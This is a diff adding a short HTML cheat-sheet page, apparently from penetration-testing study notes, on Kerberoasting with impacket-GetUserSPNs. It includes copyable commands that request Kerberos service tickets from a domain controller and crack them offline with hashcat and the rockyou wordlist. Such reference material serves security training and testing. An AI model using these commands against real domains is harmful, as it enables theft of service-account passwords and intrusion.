@@ -1,0 +1,50 @@
+<section class="page active prose-page">
+  <h1>Using impacket-GetUserSPNs</h1>
+  <p class="intro">
+    impacket-GetUserSPNs performs Kerberoasting by enumerating Service Principal Names (SPNs) and requesting Kerberos
+    service tickets (TGS) for associated service accounts. The returned tickets can then be cracked offline to recover
+    service account passwords.
+  </p>
+
+  <div class="section-title">
+    <span></span>
+    <h2>Advantages</h2>
+    <span></span>
+  </div>
+
+  <p class="content-text">
+    Supports offline password cracking, generates minimal network traffic, and works from Linux.
+  </p>
+
+  <div class="section-title">
+    <span></span>
+    <h2>Disadvantages</h2>
+    <span></span>
+  </div>
+
+  <p class="content-text">
+    Requires a valid domain account, and TGS requests can still be logged and detected by security monitoring solutions.
+  </p>
+
+  <div class="section-title">
+    <span></span>
+    <h2>Perform Kerberoasting</h2>
+    <span></span>
+  </div>
+
+  <div class="command-row">
+    <code class="copy-text">sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete</code>
+    <button class="copy-button" type="button" aria-label="Copy command">Copy</button>
+  </div>
+
+  <div class="section-title">
+    <span></span>
+    <h2>Crack Hash Use Hashcat</h2>
+    <span></span>
+  </div>
+
+  <div class="command-row">
+    <code class="copy-text">sudo hashcat -m 13100 hashes.kerberoast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force</code>
+    <button class="copy-button" type="button" aria-label="Copy command">Copy</button>
+  </div>
+</section>
